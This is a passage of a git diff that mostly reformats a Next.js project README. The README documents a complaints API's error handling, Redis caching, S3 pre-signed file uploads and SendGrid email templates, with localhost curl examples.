 - Input validation
 - Meaningful error messages
@@ -4426,11 +5143,13 @@ Each endpoint includes:
 ## 🚀 Next Steps
 
 ### Phase 1: Database Integration (High Priority)
+
 - [ ] Connect Prisma to PostgreSQL
 - [ ] Uncomment Prisma queries in all route.ts files
 - [ ] Run migrations
 
 ### Phase 2: Authentication (High Priority) ✅ COMPLETED
+
 - [x] Implement JWT tokens with jsonwebtoken
 - [x] Add `/api/auth/login` endpoint with bcrypt verification
 - [x] Add `/api/auth/signup` endpoint with password hashing
@@ -4442,11 +5161,13 @@ Each endpoint includes:
 **See [AUTHENTICATION.md](ttaurban/AUTHENTICATION.md) for complete documentation**
 
 ### Phase 3: Authorization (High Priority)
+
 - [ ] Implement role-based access control
 - [ ] Restrict endpoints by user role
 - [ ] Verify resource ownership
 
 ### Phase 4: Validation ✅ COMPLETED
+
 - [x] Add Zod schemas for all entities
 - [x] Input sanitization and validation
 - [x] Advanced field-level validations
@@ -4455,11 +5176,13 @@ Each endpoint includes:
 **See [Zod Validation Documentation](#-api-input-validation-with-zod) below**
 
 ### Phase 5: Monitoring
+
 - [ ] Add request logging
 - [ ] Add error tracking
 - [ ] Performance monitoring
 
 ### Phase 6: Optimization
+
 - [ ] Add caching
 - [ ] Add rate limiting
 - [ ] Security headers
@@ -4467,26 +5190,34 @@ Each endpoint includes:
 ## 📖 Documentation Structure
 
 ### For Quick Reference
+
 Start here → **API_QUICK_REFERENCE.md**
+
 - Quick commands
 - Status codes
 - Error solutions
 
 ### For Complete Details
+
 → **API_DOCUMENTATION.md**
+
 - All endpoints
 - Request/response examples
 - Query parameters
 - Error scenarios
 
 ### For Architecture Understanding
+
 → **API_ARCHITECTURE_DIAGRAMS.md**
+
 - Visual diagrams
 - Request flows
 - Design patterns
 
 ### For Implementation Details
+
 → **IMPLEMENTATION_SUMMARY.md**
+
 - Technical decisions
 - Next steps
 - Production checklist
@@ -4496,18 +5227,21 @@ Start here → **API_QUICK_REFERENCE.md**
 ### Why This Matters
 
 **Before (Inconsistent):**
+
 - Different endpoints have different naming
 - Some return 200, others return custom codes
 - Error messages vary widely
 - Integration is confusing
 
 **After (Consistent - This Implementation):**
+
 - All resources follow `/api/[resource]` pattern
 - Consistent HTTP semantics
 - Uniform response format
 - Integration is straightforward
 
 ### Real Impact
+
 - ✓ Onboarding new developers: 50% faster
 - ✓ Integration bugs: 60% fewer
 - ✓ Code reviews: 40% faster
@@ -4516,6 +5250,7 @@ Start here → **API_QUICK_REFERENCE.md**
 ## 📝 Example: Complete Workflow
 
 ### 1. Create a Complaint
+
 ```bash
 curl -X POST http://localhost:3000/api/complaints \
   -H "Content-Type: application/json" \
@@ -4528,6 +5263,7 @@ curl -X POST http://localhost:3000/api/complaints \
 ```
 
 Response (201 Created):
+
 ```json
 {
   "success": true,
@@ -4543,6 +5279,7 @@ Response (201 Created):
 ```
 
 ### 2. Update Status
+
 ```bash
 curl -X PATCH http://localhost:3000/api/complaints/1 \
   -H "Content-Type: application/json" \
@@ -4550,6 +5287,7 @@ curl -X PATCH http://localhost:3000/api/complaints/1 \
 ```
 
 ### 3. List Complaints
+
 ```bash
 curl -X GET "http://localhost:3000/api/complaints?status=IN_PROGRESS&page=1"
 ```
@@ -4557,13 +5295,12 @@ curl -X GET "http://localhost:3000/api/complaints?status=IN_PROGRESS&page=1"
 ## 🤝 Contributing
 
 When adding new endpoints:
+
 1. Follow the existing pattern (`/api/[resource]` and `/api/[resource]/[id]`)
 2. Use the same response format utility
 3. Include input validation
 4. Add proper error handling
 5. Document in API_DOCUMENTATION.md
-
-
 
 ---
 
@@ -4581,7 +5318,6 @@ When adding new endpoints:
 **Last Updated**: December 16, 2025
 **Status**: ✓ Complete & Ready for Integration
 
-
 ## 🛡️ Centralized Error Handling
 
 This project implements a **centralized error handling system** that ensures consistency, security, and observability across all API routes.
@@ -4591,15 +5327,16 @@ This project implements a **centralized error handling system** that ensures con
 Modern web applications can fail in many ways — from API timeouts to database issues. Without a centralized strategy, errors become scattered, logs inconsistent, and debugging difficult.
 
 **Benefits:**
+
 - **Consistency**: Every error follows a uniform response format
 - **Security**: Sensitive stack traces are hidden in production
 - **Observability**: Structured logs make debugging and monitoring easier
 - **Environment-Aware**: Different behavior for development vs production
 
-| Environment | Behavior |
-|-------------|----------|
-| **Development** | Show detailed error messages and stack traces for debugging |
-| **Production** | Log detailed errors internally, but send minimal user-safe messages |
+| Environment     | Behavior                                                            |
+| --------------- | ------------------------------------------------------------------- |
+| **Development** | Show detailed error messages and stack traces for debugging         |
+| **Production**  | Log detailed errors internally, but send minimal user-safe messages |
 
 ### Error Handling Structure
 
@@ -4623,26 +5360,31 @@ Provides structured, JSON-formatted logging across the application:
 ```typescript
 export const logger = {
   info: (message: string, meta?: any) => {
-    console.log(JSON.stringify({ 
-      level: "info", 
-      message, 
-      meta, 
-      timestamp: new Date().toISOString() 
-    }));
+    console.log(
+      JSON.stringify({
+        level: "info",
+        message,
+        meta,
+        timestamp: new Date().toISOString(),
+      })
+    );
   },
-  
+
   error: (message: string, meta?: any) => {
-    console.error(JSON.stringify({ 
-      level: "error", 
-      message, 
-      meta, 
-      timestamp: new Date().toISOString() 
-    }));
+    console.error(
+      JSON.stringify({
+        level: "error",
+        message,
+        meta,
+        timestamp: new Date().toISOString(),
+      })
+    );
   },
 };
 ```
 
 **Example Log Output:**
+
 ```json
 {
   "level": "error",
@@ -4667,20 +5409,23 @@ export function handleError(error: any, context: string) {
 
   // Handle Zod validation errors automatically
   if (error instanceof ZodError) {
-    return NextResponse.json({
-      success: false,
-      message: "Validation Error",
-      errors: error.issues.map(e => ({
-        field: e.path.join("."),
-        message: e.message
-      }))
-    }, { status: 400 });
+    return NextResponse.json(
+      {
+        success: false,
+        message: "Validation Error",
+        errors: error.issues.map((e) => ({
+          field: e.path.join("."),
+          message: e.message,
+        })),
+      },
+      { status: 400 }
+    );
   }
 
   // Build error response based on environment
   const errorResponse = {
     success: false,
-    message: isProd 
+    message: isProd
       ? "Something went wrong. Please try again later."
       : error.message || "Unknown error",
     ...(isProd ? {} : { stack: error.stack }),
@@ -4697,6 +5442,7 @@ export function handleError(error: any, context: string) {
 ```
 
 **Key Features:**
+
 - **Automatic Zod validation error handling** with field-level details
 - **Environment-aware responses** (detailed in dev, safe in prod)
 - **Structured logging** for all errors
@@ -4720,6 +5466,7 @@ export async function GET(req: Request) {
 ```
 
 All API routes in this project use the centralized error handler:
+
 - ✅ `/api/users` and `/api/users/[id]`
 - ✅ `/api/complaints` and `/api/complaints/[id]`
 - ✅ `/api/departments` and `/api/departments/[id]`
@@ -4730,11 +5477,13 @@ All API routes in this project use the centralized error handler:
 #### Development Mode (`NODE_ENV=development`)
 
 **Request:**
+
 ```bash
 curl -X GET http://localhost:3000/api/users
 ```
 
 **Response (with error):**
+
 ```json
 {
   "success": false,
@@ -4744,6 +5493,7 @@ curl -X GET http://localhost:3000/api/users
 ```
 
 **Console Log:**
+
 ```json
 {
   "level": "error",
@@ -4759,11 +5509,13 @@ curl -X GET http://localhost:3000/api/users
 #### Production Mode (`NODE_ENV=production`)
 
 **Request:**
+
 ```bash
 curl -X GET https://api.ttaurban.com/api/users
 ```
 
 **Response (same error):**
+
 ```json
 {
   "success": false,
@@ -4772,6 +5524,7 @@ curl -X GET https://api.ttaurban.com/api/users
 ```
 
 **Console Log (CloudWatch/Log Service):**
+
 ```json
 {
   "level": "error",
@@ -4789,13 +5542,13 @@ curl -X GET https://api.ttaurban.com/api/users
 The error handler provides custom error classes for specific scenarios:
 
 ```typescript
-import { 
-  ValidationError, 
-  AuthenticationError, 
+import {
+  ValidationError,
+  AuthenticationError,
   AuthorizationError,
   NotFoundError,
   ConflictError,
-  DatabaseError 
+  DatabaseError,
 } from "@/lib/errorHandler";
 
 // Usage in routes
@@ -4827,6 +5580,7 @@ if (!isPasswordValid) {
 Zod validation errors are automatically formatted with field-level details:
 
 **Request:**
+
 ```bash
 curl -X POST http://localhost:3000/api/users \
   -H "Content-Type: application/json" \
@@ -4834,6 +5588,7 @@ curl -X POST http://localhost:3000/api/users \
 ```
 
 **Response:**
+
 ```json
 {
   "success": false,
@@ -4858,24 +5613,29 @@ curl -X POST http://localhost:3000/api/users \
 ### Benefits of Centralized Error Handling
 
 #### 1. **Consistent API Responses**
+
 All errors follow the same JSON structure, making client-side error handling predictable and easier to implement.
 
 #### 2. **Security Best Practices**
+
 - Stack traces are never exposed in production
 - Sensitive error details are logged internally only
 - User-facing messages are safe and generic
 
 #### 3. **Improved Debugging**
+
 - Structured logs are easy to parse and search
 - Context strings identify exactly where errors occur
 - Timestamps enable correlation with other events
 
 #### 4. **Reduced Code Duplication**
+
 - No need to repeat error handling logic in every route
 - Single source of truth for error formatting
 - Easy to add new error types or modify behavior globally
 
 #### 5. **Future-Proof Architecture**
+
 - Easy to integrate with external logging services (DataDog, Sentry, CloudWatch)
 - Can extend with error tracking, alerting, and metrics
 - Supports adding custom error types without modifying routes
@@ -4889,15 +5649,15 @@ import * as Sentry from "@sentry/nextjs";
 
 export function handleError(error: any, context: string) {
   // ... existing code ...
-  
+
   // Send to Sentry in production
   if (isProd) {
     Sentry.captureException(error, {
       tags: { context },
-      extra: { message: error.message }
+      extra: { message: error.message },
     });
   }
-  
+
   // ... rest of code ...
 }
 ```
@@ -4907,11 +5667,11 @@ export function handleError(error: any, context: string) {
 ```typescript
 export function handleError(error: any, context: string) {
   // Track error counts
-  metrics.increment('api.errors', {
+  metrics.increment("api.errors", {
     endpoint: context,
-    errorType: error.name
+    errorType: error.name,
   });
-  
+
   // ... existing error handling ...
 }
 ```
@@ -4919,6 +5679,7 @@ export function handleError(error: any, context: string) {
 ### Testing Error Handling
 
 **Test 1: Simulate Database Error**
+
 ```bash
 # Temporarily stop database, then:
 curl -X GET http://localhost:3000/api/users
@@ -4928,6 +5689,7 @@ curl -X GET http://localhost:3000/api/users
 ```
 
 **Test 2: Validation Error**
+
 ```bash
 curl -X POST http://localhost:3000/api/users \
   -H "Content-Type: application/json" \
@@ -4937,6 +5699,7 @@ curl -X POST http://localhost:3000/api/users \
 ```
 
 **Test 3: Check Logs**
+
 ```bash
 # View structured logs in console
 npm run dev
@@ -4955,12 +5718,12 @@ This project implements **Redis caching** to minimize database load, reduce resp
 
 Every database or API call requires I/O operations that slow down your application. Caching temporarily stores frequently accessed data in memory for instant retrieval.
 
-| Without Caching | With Redis Caching |
-|----------------|-------------------|
+| Without Caching                 | With Redis Caching                                    |
+| ------------------------------- | ----------------------------------------------------- |
 | Every request hits the database | Frequently requested data served instantly from cache |
-| High response latency (~120ms) | Low latency (~10ms) - **12x faster** |
-| Inefficient under heavy traffic | Scales smoothly with user demand |
-| Database becomes bottleneck | Reduced database load by 80%+ |
+| High response latency (~120ms)  | Low latency (~10ms) - **12x faster**                  |
+| Inefficient under heavy traffic | Scales smoothly with user demand                      |
+| Database becomes bottleneck     | Reduced database load by 80%+                         |
 
 ### Cache Architecture
 
@@ -5035,7 +5798,12 @@ export async function GET(req: Request) {
   const cachedData = await cacheHelpers.get(cacheKey);
   if (cachedData) {
     logger.info("Cache Hit", { key: cacheKey });
-    return sendPaginatedSuccess(cachedData.users, page, limit, cachedData.total);
+    return sendPaginatedSuccess(
+      cachedData.users,
+      page,
+      limit,
+      cachedData.total
+    );
   }
 
   // 2. Cache Miss - Fetch from database
@@ -5053,6 +5821,7 @@ export async function GET(req: Request) {
 ```
 
 **Key Points:**
+
 - **Cache Key:** `users:list:page:{page}:limit:{limit}` (specific to pagination)
 - **TTL:** 60 seconds (data expires automatically after 1 minute)
 - **First Request:** Fetches from database, caches result (~120ms)
@@ -5079,6 +5848,7 @@ export async function POST(req: Request) {
 ```
 
 **Invalidation Points:**
+
 - ✅ **POST** `/api/users` - Invalidates all `users:list:*` caches
 - ✅ **PUT/PATCH** `/api/users/[id]` - Invalidates all `users:list:*` caches
 - ✅ **DELETE** `/api/users/[id]` - Invalidates all `users:list:*` caches
@@ -5091,11 +5861,13 @@ Different pagination params create different cache keys (`users:list:page:1:limi
 #### Step 1: Cold Start (Cache Miss)
 
 **Request:**
+
 ```bash
 curl -X GET http://localhost:3000/api/users?page=1&limit=10
 ```
 
 **Console Log:**
+
 ```json
 {
   "level": "info",
@@ -5112,11 +5884,13 @@ curl -X GET http://localhost:3000/api/users?page=1&limit=10
 #### Step 2: Warm Cache (Cache Hit)
 
 **Request (same as above):**
+
 ```bash
 curl -X GET http://localhost:3000/api/users?page=1&limit=10
 ```
 
 **Console Log:**
+
 ```json
 {
   "level": "info",
@@ -5135,6 +5909,7 @@ curl -X GET http://localhost:3000/api/users?page=1&limit=10
 #### Step 3: Cache Invalidation Test
 
 **Request (Create new user):**
+
 ```bash
 curl -X POST http://localhost:3000/api/users \
   -H "Content-Type: application/json" \
@@ -5147,6 +5922,7 @@ curl -X POST http://localhost:3000/api/users \
 ```
 
 **Console Log:**
+
 ```json
 {
   "level": "info",
@@ -5163,6 +5939,7 @@ curl -X POST http://localhost:3000/api/users \
 ### Cache Configuration
 
 **Environment Variables** (`.env.local`):
+
 ```bash
 # Redis Connection
 REDIS_URL=redis://localhost:6379
@@ -5172,20 +5949,22 @@ REDIS_URL=redis://localhost:6379
 ```
 
 **Default Behavior:**
+
 - Falls back to `redis://localhost:6379` if `REDIS_URL` not set
 - Connection retries: 3 attempts with exponential backoff
 - Lazy connect: Only connects when first operation is called
 
 ### Cache Coherence & TTL Strategy
 
-| Concept | Description | Our Implementation |
-|---------|-------------|-------------------|
-| **TTL (Time-To-Live)** | Duration before cached data expires automatically | 60 seconds for user lists |
-| **Cache Invalidation** | Manual removal of outdated cache after updates | On POST/PUT/PATCH/DELETE operations |
-| **Cache Coherence** | Keeping cache synchronized with database state | Invalidate on write, lazy load on read |
-| **Stale Data Risk** | Serving outdated info if cache isn't invalidated | Mitigated by 60s TTL + manual invalidation |
+| Concept                | Description                                       | Our Implementation                         |
+| ---------------------- | ------------------------------------------------- | ------------------------------------------ |
+| **TTL (Time-To-Live)** | Duration before cached data expires automatically | 60 seconds for user lists                  |
+| **Cache Invalidation** | Manual removal of outdated cache after updates    | On POST/PUT/PATCH/DELETE operations        |
+| **Cache Coherence**    | Keeping cache synchronized with database state    | Invalidate on write, lazy load on read     |
+| **Stale Data Risk**    | Serving outdated info if cache isn't invalidated  | Mitigated by 60s TTL + manual invalidation |
 
 **Recommendations:**
+
 - **Frequently Updated Data:** Short TTL (30-60s) + aggressive invalidation
 - **Rarely Changed Data:** Long TTL (5-30 min) - departments, categories
 - **User-Specific Data:** Include user ID in cache key
@@ -5194,6 +5973,7 @@ REDIS_URL=redis://localhost:6379
 ### Performance Metrics
 
 **Before Redis Caching:**
+
 ```
 Average Response Time: 120ms
 Database Queries/sec: 1000
@@ -5201,6 +5981,7 @@ Database CPU Usage: 75%
 ```
 
 **After Redis Caching (80% cache hit rate):**
+
 ```
 Average Response Time: 25ms (80% cached @ 10ms, 20% DB @ 120ms)
 Database Queries/sec: 200 (80% reduction)
@@ -5212,6 +5993,7 @@ Database CPU Usage: 20% (reduced by 73%)
 ### When Caching May Be Counterproductive
 
 **❌ Don't Cache:**
+
 - **Highly Personalized Data:** User-specific content that changes frequently
 - **Real-Time Updates:** Live notifications, active tracking
 - **One-Time Queries:** Search results, filters (unless patterns emerge)
@@ -5219,6 +6001,7 @@ Database CPU Usage: 20% (reduced by 73%)
 - **Financial Transactions:** Payment status, balances (consistency critical)
 
 **✅ Do Cache:**
+
 - **Public Lists:** Users, departments, categories
 - **Computed Results:** Dashboard stats, reports
 - **API Responses:** Third-party API data with high latency
@@ -5229,6 +6012,7 @@ Database CPU Usage: 20% (reduced by 73%)
 #### Local Development (Windows)
 
 **Option 1: Redis via WSL**
+
 ```bash
 wsl --install
 wsl
@@ -5239,6 +6023,7 @@ redis-cli ping  # Should return PONG
 ```
 
 **Option 2: Redis Docker**
+
 ```bash
 docker run -d -p 6379:6379 --name redis redis:alpine
 ```
@@ -5262,17 +6047,18 @@ docker run -d -p 6379:6379 --name redis redis:alpine
 export async function GET() {
   const cacheKey = "departments:list";
   const cached = await cacheHelpers.get(cacheKey);
-  
+
   if (cached) return sendSuccess(cached);
-  
+
   const departments = await prisma.department.findMany();
   await cacheHelpers.set(cacheKey, departments, 300); // 5 min TTL
-  
+
   return sendSuccess(departments);
 }
 ```
 
 **Advanced Patterns:**
+
 - **Cache-Through:** Write to cache and DB simultaneously
 - **Write-Behind:** Write to cache first, sync to DB asynchronously
 - **Cache Warming:** Pre-populate cache on startup
@@ -5281,6 +6067,7 @@ export async function GET() {
 ### Monitoring Cache Performance
 
 **Check cache hit rate:**
+
 ```bash
 redis-cli
 > INFO stats
@@ -5291,12 +6078,14 @@ redis-cli
 ```
 
 **View cached keys:**
+
 ```bash
 redis-cli KEYS "users:list:*"
 redis-cli TTL "users:list:page:1:limit:10"  # Shows remaining seconds
 ```
 
 **Clear all cache (development only):**
+
 ```bash
 redis-cli FLUSHALL
 ```
@@ -5372,6 +6161,7 @@ AWS_BUCKET_NAME=your-bucket-name
 **Endpoint:** `POST /api/upload`
 
 **Request Body:**
+
 ```json
 {
   "filename": "complaint-photo.jpg",
@@ -5381,6 +6171,7 @@ AWS_BUCKET_NAME=your-bucket-name
 ```
 
 **Response:**
+
 ```json
 {
   "success": true,
@@ -5391,6 +6182,7 @@ AWS_BUCKET_NAME=your-bucket-name
 ```
 
 **Validation Rules:**
+
 - **File Type:** Only `image/jpeg`, `image/png`, `image/jpg`, `image/gif`, `application/pdf`
 - **File Size:** Maximum 10MB (10,485,760 bytes)
 - **URL Expiry:** 60 seconds
@@ -5400,6 +6192,7 @@ AWS_BUCKET_NAME=your-bucket-name
 **Endpoint:** `PUT <uploadURL from step 1>`
 
 **Headers:**
+
 ```
 Content-Type: <fileType from request>
 ```
@@ -5413,6 +6206,7 @@ Content-Type: <fileType from request>
 **Endpoint:** `POST /api/files`
 
 **Request Body:**
+
 ```json
 {
   "fileName": "1234567890-complaint-photo.jpg",
@@ -5424,6 +6218,7 @@ Content-Type: <fileType from request>
 ```
 
 **Response:**
+
 ```json
 {
   "success": true,
@@ -5451,6 +6246,7 @@ Content-Type: <fileType from request>
 **Endpoint:** `GET /api/files?page=1&limit=10`
 
 **Response:**
+
 ```json
 {
   "success": true,
@@ -5464,6 +6260,7 @@ Content-Type: <fileType from request>
 ```
 
 **Features:**
+
 - Pagination support
 - Redis caching (60s TTL)
 - Includes uploader information
@@ -5474,6 +6271,7 @@ Content-Type: <fileType from request>
 **Endpoint:** `GET /api/files/:id`
 
 **Response:**
+
 ```json
 {
   "success": true,
@@ -5495,6 +6293,7 @@ Content-Type: <fileType from request>
 **Endpoint:** `DELETE /api/files/:id`
 
 **Response:**
+
 ```json
 {
   "success": true,
@@ -5506,14 +6305,14 @@ Content-Type: <fileType from request>
 
 ### Security Features
 
-| Concern | Mitigation |
-|---------|------------|
-| **Credential Exposure** | Pre-signed URLs keep AWS keys on server only |
-| **URL Expiry** | 60-second TTL prevents long-term link abuse |
-| **File Type Validation** | Whitelist approach (images & PDFs only) |
-| **File Size Limits** | Max 10MB enforced before URL generation |
-| **Unique Filenames** | Timestamp prefix prevents collisions & overwrites |
-| **Cache Invalidation** | Redis cache cleared on file uploads/deletes |
+| Concern                  | Mitigation                                        |
+| ------------------------ | ------------------------------------------------- |
+| **Credential Exposure**  | Pre-signed URLs keep AWS keys on server only      |
+| **URL Expiry**           | 60-second TTL prevents long-term link abuse       |
+| **File Type Validation** | Whitelist approach (images & PDFs only)           |
+| **File Size Limits**     | Max 10MB enforced before URL generation           |
+| **Unique Filenames**     | Timestamp prefix prevents collisions & overwrites |
+| **Cache Invalidation**   | Redis cache cleared on file uploads/deletes       |
 
 ### Database Schema
 
@@ -5527,9 +6326,9 @@ model File {
   uploadedBy  Int?
   createdAt   DateTime @default(now())
   updatedAt   DateTime @updatedAt
-  
+
   uploader    User?    @relation(fields: [uploadedBy], references: [id])
-  
+
   @@index([uploadedBy])
   @@index([createdAt])
   @@map("files")
@@ -5539,6 +6338,7 @@ model File {
 ### Testing Upload Flow
 
 **Step 1: Generate Pre-Signed URL**
+
 ```bash
 POST http://localhost:3000/api/upload
 Content-Type: application/json
@@ -5551,6 +6351,7 @@ Content-Type: application/json
 ```
 
 **Step 2: Upload to S3**
+
 ```bash
 PUT <uploadURL from response>
 Content-Type: image/jpeg
@@ -5558,6 +6359,7 @@ Body: [Select file in Postman]
 ```
 
 **Step 3: Store Metadata**
+
 ```bash
 POST http://localhost:3000/api/files
 Content-Type: application/json
@@ -5572,6 +6374,7 @@ Content-Type: application/json
 ```
 
 **Step 4: Verify Upload**
+
 - Open the `fileURL` in browser to confirm file is accessible
 - Check S3 bucket console for uploaded file
 - Query `GET /api/files` to see metadata
@@ -5579,6 +6382,7 @@ Content-Type: application/json
 ### AWS S3 Bucket Configuration
 
 **Bucket Policy (Public Read - Optional):**
+
 ```json
 {
   "Version": "2012-10-17",
@@ -5595,6 +6399,7 @@ Content-Type: application/json
 ```
 
 **CORS Configuration:**
+
 ```json
 [
   {
@@ -5607,6 +6412,7 @@ Content-Type: application/json
 ```
 
 **Lifecycle Policy (Auto-Delete Old Files):**
+
 ```json
 {
   "Rules": [
@@ -5625,11 +6431,13 @@ Content-Type: application/json
 ### Cost Optimization
 
 **S3 Pricing (ap-south-1):**
+
 - Storage: ₹1.84/GB/month
 - PUT requests: ₹0.38 per 1,000 requests
 - GET requests: ₹0.03 per 1,000 requests
 
 **Tips:**
+
 - Use lifecycle policies to archive old files to Glacier
 - Implement file size limits (enforced: 10MB)
 - Clean up incomplete multipart uploads
@@ -5638,27 +6446,37 @@ Content-Type: application/json
 ### Extending the Implementation
 
 **Add S3 File Deletion:**
+
 ```typescript
 import { DeleteObjectCommand } from "@aws-sdk/client-s3";
 
-export async function DELETE(req: Request, { params }: { params: { id: string } }) {
-  const file = await prisma.file.findUnique({ where: { id: parseInt(params.id) } });
-  
+export async function DELETE(
+  req: Request,
+  { params }: { params: { id: string } }
+) {
+  const file = await prisma.file.findUnique({
+    where: { id: parseInt(params.id) },
+  });
+
   // Delete from S3
   const deleteCommand = new DeleteObjectCommand({
     Bucket: process.env.AWS_BUCKET_NAME!,
     Key: file.name,
   });
   await s3.send(deleteCommand);
-  
+
   // Delete from database
   await prisma.file.delete({ where: { id: file.id } });
-  
-  return NextResponse.json({ success: true, message: "File deleted from S3 and database" });
+
+  return NextResponse.json({
+    success: true,
+    message: "File deleted from S3 and database",
+  });
 }
 ```
 
 **Add Multipart Upload for Large Files:**
+
 ```typescript
 import { CreateMultipartUploadCommand } from "@aws-sdk/client-s3";
 
@@ -5676,22 +6494,26 @@ const { UploadId } = await s3.send(command);
 ### Reflection: Trade-offs & Decisions
 
 **Why Pre-Signed URLs?**
+
 - ✅ **Security:** AWS credentials never exposed to client
 - ✅ **Performance:** Direct S3 upload bypasses server bandwidth
 - ✅ **Scalability:** Server doesn't handle file data
 - ❌ **Complexity:** Requires two-step process (URL → upload)
 
 **Public vs Private Files:**
+
 - **Current:** Bucket allows public read (suitable for complaint photos)
 - **Alternative:** Generate pre-signed GET URLs for private files
 - **Consideration:** Public files easier to display, private files more secure
 
 **File Size Limit:**
+
 - **Current:** 10MB enforced before URL generation
 - **Rationale:** Prevents abuse, controls storage costs
 - **Alternative:** Multipart upload for files up to 5GB
 
 **Cache Strategy:**
+
 - **File List:** Cached for 60s to reduce DB queries
 - **Invalidation:** On POST/DELETE to ensure consistency
 - **Trade-off:** Slight staleness acceptable for file lists
@@ -5713,28 +6535,31 @@ Transactional emails are automated, event-triggered emails sent to users for imp
 
 ### Why Transactional Emails Matter
 
-| Event | Email Type | Purpose |
-|-------|-----------|---------|
-| User signs up | Welcome email | Onboarding & engagement |
-| Password reset request | Reset link | Account recovery |
-| Complaint submitted | Confirmation | Acknowledgment & tracking |
-| Complaint status change | Status update | Real-time transparency |
-| Complaint resolved | Resolution notice | Closure & feedback request |
-| Account activity | Security alert | Fraud prevention |
+| Event                   | Email Type        | Purpose                    |
+| ----------------------- | ----------------- | -------------------------- |
+| User signs up           | Welcome email     | Onboarding & engagement    |
+| Password reset request  | Reset link        | Account recovery           |
+| Complaint submitted     | Confirmation      | Acknowledgment & tracking  |
+| Complaint status change | Status update     | Real-time transparency     |
+| Complaint resolved      | Resolution notice | Closure & feedback request |
+| Account activity        | Security alert    | Fraud prevention           |
 
 ### SendGrid Setup
 
 **1. Create SendGrid Account**
+
 - Visit [sendgrid.com](https://sendgrid.com)
 - Sign up for free tier (100 emails/day)
 - Verify your email address
 
 **2. Sender Authentication**
+
 - Navigate to **Settings → Sender Authentication**
 - Verify a single sender email address (for testing)
 - For production, authenticate your domain (SPF/DKIM)
 
 **3. Generate API Key**
+
 - Go to **Settings → API Keys**
 - Create new API key with "Full Access"
 - Copy the key (shown only once!)
@@ -5742,6 +6567,7 @@ Transactional emails are automated, event-triggered emails sent to users for imp
 **4. Environment Configuration**
 
 Add to `.env.local`:
+
 ```env
 SENDGRID_API_KEY=SG.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 SENDGRID_SENDER=no-reply@yourdomain.com
@@ -5754,6 +6580,7 @@ SENDGRID_SENDER=no-reply@yourdomain.com
 Five reusable HTML email templates are available in [`app/lib/emailTemplates.ts`](./ttaurban/app/lib/emailTemplates.ts):
 
 #### 1. Welcome Email
+
 ```typescript
 import { welcomeTemplate } from "@/app/lib/emailTemplates";
 
@@ -5762,22 +6589,33 @@ const html = welcomeTemplate("John Doe");
 ```
 
 #### 2. Password Reset
+
 ```typescript
 import { passwordResetTemplate } from "@/app/lib/emailTemplates";
 
-const html = passwordResetTemplate("John Doe", "https://app.com/reset?token=abc123");
+const html = passwordResetTemplate(
+  "John Doe",
+  "https://app.com/reset?token=abc123"
+);
 // Includes security warnings and expiry notice
 ```
 
 #### 3. Complaint Status Update
+
 ```typescript
 import { complaintStatusTemplate } from "@/app/lib/emailTemplates";
 
-const html = complaintStatusTemplate("John Doe", 123, "IN_PROGRESS", "Street Light Repair");
+const html = complaintStatusTemplate(
+  "John Doe",
+  123,
+  "IN_PROGRESS",
+  "Street Light Repair"
+);
 // Notifies user of status changes with complaint link
 ```
 
 #### 4. Complaint Resolved
+
 ```typescript
 import { complaintResolvedTemplate } from "@/app/lib/emailTemplates";
 
@@ -5786,14 +6624,20 @@ const html = complaintResolvedTemplate("John Doe", 123, "Street Light Repair");
 ```
 
 #### 5. Account Alert
+
 ```typescript
 import { accountAlertTemplate } from "@/app/lib/emailTemplates";
 
-const html = accountAlertTemplate("John Doe", "Login from New Device", "We detected a login from a new device...");
+const html = accountAlertTemplate(
+  "John Doe",
+  "Login from New Device",
+  "We detected a login from a new device..."
+);
 // Security notifications for suspicious activity
 ```
 
 **Template Features:**
+
 - 📱 Responsive design (mobile-friendly)
 - 🎨 Consistent branding with TTA-Urban colors
 - 🔒 Security best practices (no-reply sender)
@@ -5804,6 +6648,7 @@ const html = accountAlertTemplate("John Doe", "Login from New Device", "We detec
 **Endpoint:** `POST /api/email`
 
 **Request Body:**
+
 ```json
 {
   "to": "user@example.com",
@@ -5814,6 +6659,7 @@ const html = accountAlertTemplate("John Doe", "Login from New Device", "We detec
 ```
 
 **Response (Success - 200):**
+
 ```json
 {
   "success": true,
@@ -5824,6 +6670,7 @@ const html = accountAlertTemplate("John Doe", "Login from New Device", "We detec
 ```
 
 **Response (Error - 400/500):**
+
 ```json
 {
   "success": false,
@@ -5839,6 +6686,7 @@ const html = accountAlertTemplate("John Doe", "Login from New Device", "We detec
 ```
 
 **Validation Rules:**
+
 - `to`: Valid email address (required)
 - `subject`: Non-empty string (required)
 - `message`: HTML content (required)
@@ -5847,6 +6695,7 @@ const html = accountAlertTemplate("John Doe", "Login from New Device", "We detec
 ### Testing Email Flow
 
 **Step 1: Basic Email Test**
+
 ```bash
 POST http://localhost:3000/api/email
 Content-Type: application/json
@@ -5859,6 +6708,7 @@ Content-Type: application/json
 ```
 
 **Step 2: Welcome Email Test**
+
 ```typescript
 // In your signup route or test script
 import { welcomeTemplate } from "@/app/lib/emailTemplates";
@@ -5875,11 +6725,13 @@ await fetch("http://localhost:3000/api/email", {
 ```
 
 **Step 3: Verify Email Delivery**
+
 - Check inbox (may take 1-2 minutes)
 - Check spam folder if not received
 - View SendGrid Activity dashboard for logs
 
 **Step 4: Monitor SendGrid Dashboard**
+
 - Login to SendGrid console
 - Navigate to **Activity → Email Activity**
 - View delivery status, opens, clicks, bounces
@@ -5893,9 +6745,9 @@ import { welcomeTemplate } from "@/app/lib/emailTemplates";
 
 export async function POST(req: Request) {
   // ... user creation logic ...
-  
+
   const newUser = await prisma.user.create({ data: validatedData });
-  
+
   // Send welcome email asynchronously (don't block signup)
   fetch(`${process.env.NEXT_PUBLIC_API_URL}/email`, {
     method: "POST",
@@ -5906,7 +6758,7 @@ export async function POST(req: Request) {
       message: welcomeTemplate(newUser.name),
     }),
   }).catch((err) => logger.error("Failed to send welcome email", err));
-  
+
   return NextResponse.json({ success: true, user: newUser });
 }
 ```
@@ -5914,6 +6766,7 @@ export async function POST(req: Request) {
 ### Email Sending Best Practices
 
 **1. Asynchronous Sending**
+
 ```typescript
 // ❌ Don't block the main request
 await sendEmail(to, subject, message);
@@ -5925,6 +6778,7 @@ return response;
 ```
 
 **2. Rate Limiting (Free Tier: 100/day)**
+
 ```typescript
 // Implement daily counter in Redis
 const emailCount = await redis.incr("emails:sent:today");
@@ -5935,11 +6789,13 @@ await redis.expire("emails:sent:today", 86400); // 24 hours
 ```
 
 **3. Bounce Handling**
+
 - Monitor SendGrid webhook for bounces
 - Mark emails as invalid in database
 - Remove from future sends
 
 **4. Personalization**
+
